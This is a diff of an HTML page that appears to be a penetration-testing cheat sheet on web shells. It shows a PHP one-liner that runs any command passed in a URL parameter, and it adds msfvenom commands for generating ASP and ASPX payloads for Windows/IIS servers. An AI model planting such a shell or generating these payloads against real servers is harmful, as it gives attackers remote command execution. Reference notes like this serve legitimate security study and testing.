@@ -34,8 +34,28 @@ layout: default
         <li>&lt;?php echo &quot;START&lt;br/&gt;&lt;br/&gt;\n\n\n&quot;; system($_GET[&quot;cmd&quot;]); echo &quot;\n\n\n&lt;br/&gt;&lt;br/&gt;END&quot;; ?&gt;</li>
     </ul>
 
-    <li>asp</li>
+    <li>Windows / IIS</li>
+    <table>
+        <tr>
+            <td>asp</td>
+            <td>
+                <li>vbscript based</li>
+                <li>Older (around 2003)</li>
+            </td>
+        </tr>
+        <td>
+            <td>aspx</td>
+            <td>
+                <li>.net based</li>
+                <li>Newer</li>
+            </td>
+        </td>
+    </table>
+
+    <li>asp or aspx</li>
     <ul>
+        <li>msfvenom -f asp</li>
+        <li>msfvenom -f aspx</li>
         <li>
             <pre>
 &lt;%
